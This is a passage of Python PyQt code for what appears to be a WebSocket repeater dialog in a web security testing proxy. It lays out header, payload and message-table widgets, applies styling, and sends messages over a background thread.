        url_row.addWidget(self._url_edit)
        root.addLayout(url_row)

        # Extra headers row
        hdr_row = QHBoxLayout()
        hdr_lbl = QLabel("Headers:")
        hdr_lbl.setFixedWidth(55)
        hdr_row.addWidget(hdr_lbl)
        self._hdr_edit = QLineEdit()
        self._hdr_edit.setPlaceholderText(
            "Optional – Cookie: session=abc; tracker=xyz; Origin: https://target"
        )
        # Pre-populate with captured headers (e.g. Cookie, Origin) passed from
        # WS History.  Format: "Key: Value; Key2: Value2"
        if self._initial_headers:
            hdr_str = "; ".join(f"{k}: {v}" for k, v in self._initial_headers.items())
            self._hdr_edit.setText(hdr_str)
        hdr_row.addWidget(self._hdr_edit)
        root.addLayout(hdr_row)

        # Payload / Response splitter
        splitter = QSplitter(Qt.Horizontal)
        splitter.setHandleWidth(4)

        req_w = QWidget()
        req_lay = QVBoxLayout(req_w)
        req_lay.setContentsMargins(0, 0, 4, 0)
        req_lay.setSpacing(3)
        req_hdr = QHBoxLayout()
        req_hdr.addWidget(QLabel("📤 Payload"))
        req_hdr.addStretch()
        clr_req = QPushButton("Clear")
        clr_req.setMaximumWidth(50)
        clr_req.clicked.connect(lambda: self._payload_edit.clear())
        req_hdr.addWidget(clr_req)
        req_lay.addLayout(req_hdr)
        self._payload_edit = QTextEdit()
        self._payload_edit.setFont(QFont(FONT_FAMILY_MONO, 10))
        self._payload_edit.setPlainText(payload)
        req_lay.addWidget(self._payload_edit)
        splitter.addWidget(req_w)

        resp_w = QWidget()
        resp_lay = QVBoxLayout(resp_w)
        resp_lay.setContentsMargins(4, 0, 0, 0)
        resp_lay.setSpacing(0)

        # ── Inner vertical splitter: message table (top) + detail (bottom) ──
        resp_split = QSplitter(Qt.Vertical)
        resp_split.setHandleWidth(4)
        resp_split.setChildrenCollapsible(False)

        # Message table – mirrors WS History layout
        self._msg_table = QTableWidget()
        self._msg_table.setColumnCount(5)
        self._msg_table.setHorizontalHeaderLabels(["#", "Direction", "Type", "Len", "Preview"])
        self._msg_table.setAlternatingRowColors(False)
        self._msg_table.setSelectionBehavior(QTableWidget.SelectRows)
        self._msg_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._msg_table.verticalHeader().hide()
        self._msg_table.verticalHeader().setDefaultSectionSize(24)
        self._msg_table.setSortingEnabled(False)
        msg_hdr = self._msg_table.horizontalHeader()
        msg_hdr.resizeSection(0, 40)
        msg_hdr.resizeSection(1, 140)
        msg_hdr.resizeSection(2, 60)
        msg_hdr.resizeSection(3, 65)
        msg_hdr.setSectionResizeMode(4, QHeaderView.Stretch)
        msg_hdr.setDefaultAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        self._msg_table.itemSelectionChanged.connect(self._on_msg_selected)
        resp_split.addWidget(self._msg_table)

        # Detail panel – shows full payload for selected row
        detail_w = QWidget()
        detail_lay = QVBoxLayout(detail_w)
        detail_lay.setContentsMargins(0, 0, 0, 0)
        detail_lay.setSpacing(0)

        detail_hdr_w = QWidget()
        detail_hdr_w.setMaximumHeight(30)
        detail_hdr_w.setObjectName("detailHeader")
        dh_lay = QHBoxLayout(detail_hdr_w)
        dh_lay.setContentsMargins(8, 3, 8, 3)
        self._detail_title = QLabel("🔌 WebSocket Message")
        self._detail_title.setStyleSheet(f"color: {COLOR_TEXT_BRIGHT}; font-weight: 700; font-size: 11px;")
        dh_lay.addWidget(self._detail_title)
        dh_lay.addStretch()
        copy_btn = QPushButton("📋 Copy")
        copy_btn.setMaximumWidth(65)
        copy_btn.setToolTip("Copy message payload to clipboard")
        copy_btn.clicked.connect(self._copy_detail)
        dh_lay.addWidget(copy_btn)
        clr_resp = QPushButton("Clear")
        clr_resp.setMaximumWidth(55)
        clr_resp.clicked.connect(self._clear_messages)
        dh_lay.addWidget(clr_resp)
        detail_lay.addWidget(detail_hdr_w)

        self._detail_edit = QTextEdit()
        self._detail_edit.setReadOnly(True)
        self._detail_edit.setFont(QFont(FONT_FAMILY_MONO, 10))
        detail_lay.addWidget(self._detail_edit)
        resp_split.addWidget(detail_w)
        resp_split.setSizes([200, 160])

        resp_lay.addWidget(resp_split)
        splitter.addWidget(resp_w)

        splitter.setSizes([450, 450])
        root.addWidget(splitter)

        # Bottom bar
        bot = QHBoxLayout()
        self._status_lbl = QLabel("⏹ Ready")
        self._status_lbl.setStyleSheet(f"color: {COLOR_TEXT_MUTED};")
        bot.addWidget(self._status_lbl)
        bot.addStretch()

        # Opcode selector
        bot.addWidget(QLabel("Type:"))
        self._opcode_combo = QComboBox()
        self._opcode_combo.addItems(["text", "binary"])
        self._opcode_combo.setCurrentText(self._opcode)
        self._opcode_combo.setMaximumWidth(80)
        bot.addWidget(self._opcode_combo)

        self._send_btn = QPushButton("▶  Send")
        self._send_btn.setMinimumWidth(90)
        self._send_btn.setStyleSheet(
            f"background-color: {COLOR_ACCENT}; color: white; font-weight: 600;"
        )
        self._send_btn.clicked.connect(self._on_send)
        bot.addWidget(self._send_btn)
        root.addLayout(bot)

    def _apply_style(self):
        self.setStyleSheet(f"""
            QWidget {{ background-color: {COLOR_DARK_BG}; color: {COLOR_TEXT}; }}
            QLabel  {{ color: {COLOR_TEXT}; background: transparent; }}
            QLineEdit, QTextEdit {{
                background-color: {COLOR_CARD_BG};
                border: 1px solid {COLOR_BORDER};
                border-radius: 3px;
                color: {COLOR_TEXT_BRIGHT};
                font-size: 12px;
                padding: 3px;
            }}
            QPushButton {{
                background-color: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT_BRIGHT};
                border: 1px solid {COLOR_BORDER};
                border-radius: 3px;
                padding: 4px 10px;
            }}
            QPushButton:hover {{ background-color: {COLOR_HOVER}; }}
            QPushButton:disabled {{ color: {COLOR_TEXT_MUTED}; }}
            QSplitter::handle:horizontal {{ background-color: {COLOR_BORDER}; }}
            QSplitter::handle:vertical   {{ background-color: {COLOR_BORDER}; }}
            QComboBox {{
                background-color: {COLOR_CARD_BG};
                border: 1px solid {COLOR_BORDER};
                border-radius: 3px;
                color: {COLOR_TEXT_BRIGHT};
                padding: 2px 6px;
            }}
            QTableWidget {{
                background-color: {COLOR_DARK_BG};
                gridline-color: {COLOR_BORDER};
                border: none;
                color: {COLOR_TEXT};
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 12px;
                selection-background-color: {COLOR_ACCENT};
                selection-color: #ffffff;
                outline: none;
            }}
            QTableWidget::item {{
                padding: 2px 6px;
                border: none;
                border-bottom: 1px solid #2a2a2a;
            }}
            QTableWidget::item:selected {{
                background-color: {COLOR_ACCENT};
                color: #ffffff;
            }}
            QHeaderView::section {{
                background-color: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT_BRIGHT};
                padding: 4px 8px;
                border: none;
                border-right: 1px solid {COLOR_BORDER};
                border-bottom: 2px solid {COLOR_ACCENT};
                font-weight: bold;
                font-size: 12px;
            }}
            QWidget#detailHeader {{
                background-color: {COLOR_ELEVATED_BG};
                border-bottom: 1px solid {COLOR_BORDER};
            }}
        """)

    # ── Slots ──────────────────────────────────────────────────────────────

    def _on_send(self):
        url     = self._url_edit.text().strip()
        payload = self._payload_edit.toPlainText()
        opcode  = self._opcode_combo.currentText()

        if not url:
            self._status_lbl.setText("✗ No URL specified")
            return

        extra_hdrs: dict = {}
        hdr_text = self._hdr_edit.text().strip()
        if hdr_text:
            # Split on semicolons ONLY where the next token looks like "HeaderName:"
            # This correctly handles  Cookie: a=b; c=d; Origin: https://example.com
            parts = re.split(r';\s*(?=[\w\-]+\s*:)', hdr_text)
            for part in parts:
                if ":" in part:
                    k, _, v = part.partition(":")
                    k = k.strip()
                    if k:
                        extra_hdrs[k] = v.strip()

        if self._thread and self._thread.isRunning():
            self._thread.stop()
            self._thread.wait(3000)

        self._send_btn.setEnabled(False)
        self._status_lbl.setText("⏳ Connecting…")
        self._add_msg_row("↑ client→server", opcode, payload)

        self._thread = WSSendThread(url, payload, opcode, extra_hdrs)
        self._thread.connected.connect(
            lambda: self._status_lbl.setText("✓ Connected – waiting for response…")
        )
        self._thread.msg_rx.connect(self._on_message)
        self._thread.error.connect(self._on_error)
        self._thread.finished_ok.connect(self._on_done)
        self._thread.start()

    def _on_message(self, msg: str):
        self._add_msg_row("↓ server→client", "text", msg)

    def _on_error(self, err: str):
        self._add_msg_row("⚠ error", "error", f"Error: {err}")
        self._status_lbl.setText(f"✗ {err}")
        self._send_btn.setEnabled(True)

    def _on_done(self):
        self._status_lbl.setText("⏹ Done")
        self._send_btn.setEnabled(True)

    # ── Message table helpers ──────────────────────────────────────────────

    def _add_msg_row(self, direction: str, opcode: str, payload: str):
        """Insert one row into the message table and select it."""
        self._msg_counter += 1
        self._messages.append({"direction": direction, "opcode": opcode, "payload": payload})
        msg_idx = len(self._messages) - 1

        row = self._msg_table.rowCount()
        self._msg_table.insertRow(row)

        length  = len(payload.encode("utf-8", errors="replace"))
        preview = payload[:120].replace("\n", " ").replace("\r", "")

        if "client" in direction:
            dir_color = "#61dafb"   # blue  – sent
        elif "server" in direction:
            dir_color = "#98c379"   # green – received
        else:
            dir_color = "#e06c75"   # red   – error

        cells = [
            QTableWidgetItem(str(self._msg_counter)),
            QTableWidgetItem(direction),
            QTableWidgetItem(opcode),
            QTableWidgetItem(str(length)),
            QTableWidgetItem(preview),
        ]
        for col, item in enumerate(cells):
            if col == 1:
                item.setForeground(QColor(dir_color))
            item.setData(Qt.UserRole, msg_idx)
            self._msg_table.setItem(row, col, item)

        self._msg_table.scrollToBottom()
        self._msg_table.selectRow(row)

    def _on_msg_selected(self):
        row = self._msg_table.currentRow()
        if row < 0:
            self._detail_edit.clear()
            return
        first = self._msg_table.item(row, 0)
        if not first:
            return
        msg_idx = first.data(Qt.UserRole)
        if msg_idx is None or msg_idx >= len(self._messages):
            return
        entry     = self._messages[msg_idx]
        direction = entry["direction"]
        opcode    = entry["opcode"]
        payload   = entry["payload"]

        if "client" in direction:
            icon = "📤 Sent"
        elif "server" in direction:
            icon = "📨 Received"
        else:
            icon = "⚠ Error"
        self._detail_title.setText(f"{icon} – {opcode}")

        try:
            parsed  = json.loads(payload)
            display = json.dumps(parsed, indent=2, ensure_ascii=False)
        except Exception:
            display = payload
        self._detail_edit.setPlainText(display)

    def _copy_detail(self):
        text = self._detail_edit.toPlainText()
        if text:
            QApplication.clipboard().setText(text)

    def _clear_messages(self):
        self._msg_table.setRowCount(0)
        self._messages.clear()
        self._msg_counter = 0
        self._detail_edit.clear()
        self._detail_title.setText("🔌 WebSocket Message")

    def closeEvent(self, event):
        if self._thread and self._thread.isRunning():
            self._thread.stop()
            self._thread.wait(3000)
        super().closeEvent(event)